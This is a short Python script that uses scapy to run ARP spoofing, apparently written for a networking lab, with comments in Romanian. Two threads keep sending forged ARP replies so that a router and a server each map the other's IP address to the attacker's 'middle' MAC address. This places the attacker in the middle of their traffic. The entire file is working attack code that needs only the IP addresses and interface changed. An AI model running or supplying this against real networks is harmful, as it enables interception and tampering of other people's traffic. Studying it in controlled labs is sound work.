from scapy.all import ARP, send, get_if_hwaddr
import threading
import time

target1_ip = "198.7.0.1"  # ip ul la router
target2_ip = "198.7.0.2"  # ip ul la server

iface = "eth1"
middle_mac = get_if_hwaddr(iface) #adresa MAC la middle

def spoof(target_ip, spoof_ip):
    arp_packet = ARP(
        op=2,                # tipul pachetului ARP de tip reply
        pdst=target_ip,      # ip-ul victimei, adica cui trimitem
        psrc=spoof_ip,       # ip-ul cui ne prefacem ca suntem
        hwdst="ff:ff:ff:ff:ff:ff",  # broadcast dar merge si fara, e MAC ul victimei
        hwsrc=middle_mac     # MAC-ul middle 
    )
    while True:
        send(arp_packet, iface=iface, verbose=False) #trimit pachete la 2 secunde
        print(f"[+] Sent spoof: {spoof_ip} is-at {middle_mac} to {target_ip}")
        time.sleep(2)

if __name__ == "__main__":
    print(f"[i] Middle MAC on {iface}: {middle_mac}")

    
    t1 = threading.Thread(target=spoof, args=(target1_ip, target2_ip))    #mesaje false la router
    t2 = threading.Thread(target=spoof, args=(target2_ip, target1_ip))   #la server
    t1.start()
    t2.start()
    t1.join()
    t2.join()

